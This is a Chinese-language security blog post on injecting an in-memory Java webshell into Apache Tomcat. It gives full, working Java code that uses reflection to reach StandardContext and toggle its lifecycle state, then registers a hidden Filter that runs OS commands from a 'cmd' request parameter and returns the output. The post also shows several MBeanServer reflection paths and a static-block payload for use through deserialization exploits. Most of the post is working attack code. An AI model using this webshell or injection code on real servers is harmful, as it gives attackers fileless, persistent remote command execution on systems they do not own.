<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>学习JAVA内存SHELL - x1a0t&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=JAVA>
  
  
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
  
  
    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.2.0"></head>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">x1a0t&#39;s Blog</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/links" class="menu-item-link">Links</a>
        </li>
      
        <li class="menu-item">
          <a href="/notes" class="menu-item-link">Notes</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
    </ul>
  </nav>
</header>
<article class="post">
  <div class="post-title">
    <h1 class="article-title">学习JAVA内存SHELL</h1>
  </div>
   <div class="post-meta">
    <span class="post-time">2020-08-04</span>
    
      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/JAVA/" rel="tag">JAVA</a></li></ul>
    
  </div>
  <div class="post-content">
    <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>从java反序列化命令回显到java内存shell，感谢大佬们的不断研究以及乐于分享~</p>
<p>首先参看<a href="https://www.jianshu.com/p/cbe1c3174d41">这篇文章</a>，里面提到Servlet 3.0+中，支持在ServletContext初始化的时候动态注册Servlet+Filter+Listener，但在我们请求Servlet时其实ServletContext已经初始化过了!<br><img src="/2020/08/04/Study-Java-Memory-Shell/cannotReg.png"><br>那该如何注入一个java内存shell呢?下面我主要演示的是注入Filter的方式，毕竟这类相对好使</p>
<h1 id="获取StandardContext，修改初始化状态"><a href="#获取StandardContext，修改初始化状态" class="headerlink" title="获取StandardContext，修改初始化状态"></a>获取StandardContext，修改初始化状态</h1><p>参看<a href="https://xz.aliyun.com/t/7388">threedr3am大佬的文章</a>中，注入内存shell的部分</p>
<p>首先利用ServletContext遍历出标准上下文对象StandardContext，然后反射修改<code>StandardContext.state</code>的值，然后利用<code>ServletContext.addFilter(</code>动态注册，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//遍历出标准上下文对象</span></span><br><span class="line">            <span class="keyword">for</span> (; standardContext == <span class="literal">null</span>; ) &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> contextField.get(servletContext);</span><br><span class="line">                <span class="keyword">if</span> (o <span class="keyword">instanceof</span> ServletContext) &#123;</span><br><span class="line">                    servletContext = (ServletContext) o;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">                    standardContext = (StandardContext) o;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改初始化状态</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">            stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加filter马</span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell</span>();</span><br><span class="line">            <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;hahahaha&quot;</span>;</span><br><span class="line">            javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> servletContext.addFilter(filterName, shell);</span><br><span class="line">            filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line">            filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>, <span class="string">&quot;/fajlf2lk3jfalk&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//状态恢复，要不然服务不可用</span></span><br><span class="line">            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//生效filter</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">            filterStartMethod.invoke(standardContext, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// //把filter插到第一位</span></span><br><span class="line">            <span class="comment">// FilterMap[] filterMaps = standardContext.findFilterMaps();</span></span><br><span class="line">            <span class="comment">// for (int i = 0; i &lt; filterMaps.length; i++) &#123;</span></span><br><span class="line">            <span class="comment">//     if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) &#123;</span></span><br><span class="line">            <span class="comment">//         FilterMap filterMap = filterMaps[i];</span></span><br><span class="line">            <span class="comment">//         filterMaps[i] = filterMaps[0];</span></span><br><span class="line">            <span class="comment">//         filterMaps[0] = filterMap;</span></span><br><span class="line">            <span class="comment">//         break;</span></span><br><span class="line">            <span class="comment">//     &#125;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="获取StandardContext，添加FilterMap"><a href="#获取StandardContext，添加FilterMap" class="headerlink" title="获取StandardContext，添加FilterMap"></a>获取StandardContext，添加FilterMap</h1><p>参看<a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">l1nk3r大佬的文章</a>，先利用StandardContext.addFilterDef(定义一个Filter，添加映射，最后在filterConfigs添加filter配置，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个filter</span></span><br><span class="line"><span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat8FilterShell</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;hahahaha&quot;</span>;</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">standardCtx.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加一个filter映射</span></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">m.setFilterName(filterDef.getFilterName());</span><br><span class="line">m.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">m.addURLPattern(<span class="string">&quot;/fjl1lalbjkasdk&quot;</span>);</span><br><span class="line">standardCtx.addFilterMapBefore(m);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加filter配置</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">FilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (FilterConfig) constructor.newInstance(standardCtx, filterDef);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> standardCtx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (HashMap) field.get(standardCtx);</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure>
<p>文中也提醒了tomcat7和8中的FilterDef和FilterMap包名是有所不同的~</p>
<h1 id="获取StandardContext"><a href="#获取StandardContext" class="headerlink" title="获取StandardContext"></a>获取StandardContext</h1><p>以上情况都基于已经获取到StandardContext的情况，那么从JspShell到内存shell也就基本不是问题了</p>
<p>那么像在java反序列化的情况下如何去获取StandardContext呢?</p>
<ul>
<li>在<a href="https://www.anquanke.com/post/id/198886">LandGrey大佬的文章中</a>详细列出了在spring中获取WebApplicationContext并注入内存shell的操作，也不难想到各种容器以及项目可能存在不同的获取标准上下文对象的操作</li>
<li>在<a href="https://xz.aliyun.com/t/7348">kk大佬的文章中</a>，其找到的org.apache.catalina.core.ApplicationDispatcher类，通过反射修改<code>WRAP_SAME_OBJECT=true</code>，并初始化lastServicedRequest和lastServicedResponse为ThreadLocal&lt;&gt;，那么在下次请求即可从中获取到ServletRequest，再进一步就是上面threedr3am大佬的文章中的操作：<code>ServletRequest.getServletContext()</code>获取ServletContext，再遍历获取到StandardContext</li>
<li>在<a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">Litch1大佬的文章中</a>，提到可以利用简单两行代码获取到StandardContext，但tomcat7不适用<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure></li>
<li>最后是<a href="https://xz.aliyun.com/t/7535">李三大佬的文章中</a>直接到MBeanServer中去找，但是只给到了拿org.apache.coyote.Request的代码，其实顺着给的代码找也可以拿到StandardContext<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(<span class="literal">null</span>, <span class="literal">null</span>).getMBeanServer().mbsInterceptor.repository.domainTb.get(<span class="string">&quot;Catalina&quot;</span>).get(<span class="string">&quot;name=\&quot;http-nio-8888\&quot;,type=GlobalRequestProcessor&quot;</span>).object.resource.processors.get(<span class="number">1</span>).req.notes[<span class="number">1</span>].filterChain.filters[<span class="number">0</span>].context</span><br></pre></td></tr></table></figure>
作为学习者，我自己又另外找了两条<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(<span class="literal">null</span>, <span class="literal">null</span>).getMBeanServer().mbsInterceptor.repository.domainTb.get(<span class="string">&quot;Catalina&quot;</span>).get(<span class="string">&quot;type=Mapper&quot;</span>).object.resource.mapper.contextObjectToContextVersionMap.keySet().toArray()</span><br></pre></td></tr></table></figure>
<img src="/2020/08/04/Study-Java-Memory-Shell/1.png"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(<span class="literal">null</span>, <span class="literal">null</span>).getMBeanServer().mbsInterceptor.repository.domainTb.get(<span class="string">&quot;Catalina&quot;</span>).get(<span class="string">&quot;host=localhost,type=Host&quot;</span>).object.resource.children</span><br></pre></td></tr></table></figure>
<img src="/2020/08/04/Study-Java-Memory-Shell/2.png"><br>那么在java反序列化中，利用代码大概长这样(以第二条为例)</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">MBeanServer</span> <span class="variable">mbeanServer</span> <span class="operator">=</span> Registry.getRegistry(<span class="literal">null</span>, <span class="literal">null</span>).getMBeanServer();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">        field = Class.forName(<span class="string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">        field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> (HashMap)field.get(obj);</span><br><span class="line">        obj = ((HashMap)obj2.get(<span class="string">&quot;Catalina&quot;</span>)).get(<span class="string">&quot;host=localhost,type=Host&quot;</span>);</span><br><span class="line"></span><br><span class="line">        field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span>).getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">        field = Class.forName(<span class="string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span>).getDeclaredField(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ContainerBase</span> <span class="variable">containerBase</span> <span class="operator">=</span> (ContainerBase) field.get(obj);</span><br><span class="line"></span><br><span class="line">        field = Class.forName(<span class="string">&quot;org.apache.catalina.core.ContainerBase&quot;</span>).getDeclaredField(<span class="string">&quot;children&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">children</span> <span class="operator">=</span> (HashMap) field.get(containerBase);</span><br><span class="line"></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) children.get(<span class="string">&quot;/cas&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> standardContext.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">        stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//添加filter马</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell</span>();</span><br><span class="line">        javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> servletContext.addFilter(<span class="string">&quot;wowowowowo&quot;</span>, shell);</span><br><span class="line">        filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line">        filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>, <span class="string">&quot;/fajlf2lk3jfalk&quot;</span>);</span><br><span class="line">        <span class="comment">//状态恢复，要不然服务不可用</span></span><br><span class="line">        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生效filter</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">        filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filterStartMethod.invoke(standardContext, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单看看效果如何<br><img src="/2020/08/04/Study-Java-Memory-Shell/exp.gif"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.anquanke.com/post/id/198886">https://www.anquanke.com/post/id/198886</a><br><a href="https://xz.aliyun.com/t/7348">https://xz.aliyun.com/t/7348</a><br><a href="https://xz.aliyun.com/t/7388">https://xz.aliyun.com/t/7388</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651374294&amp;idx=3&amp;sn=82d050ca7268bdb7bcf7ff7ff293d7b3</a><br><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA</a><br><a href="https://xz.aliyun.com/t/7535">https://xz.aliyun.com/t/7535</a><br><a href="https://github.com/threedr3am/ysoserial">https://github.com/threedr3am/ysoserial</a></p>
<p>宽字节基于Servlet的webshell系列文章<br><a href="https://forum.90sec.com/t/topic/1162">https://forum.90sec.com/t/topic/1162</a><br><a href="https://forum.90sec.com/t/topic/1139">https://forum.90sec.com/t/topic/1139</a><br><a href="https://forum.90sec.com/t/topic/1111">https://forum.90sec.com/t/topic/1111</a><br><a href="https://forum.90sec.com/t/topic/1136">https://forum.90sec.com/t/topic/1136</a></p>

  </div>
  <div class="post-footer">
    <a href="#top" class="top">Post.Top</a>
  </div>
</article>
<footer>
  &copy; 2024
  <span class="author">
    x1a0t
  </span>
</footer>
    </div>
  </body>
</html>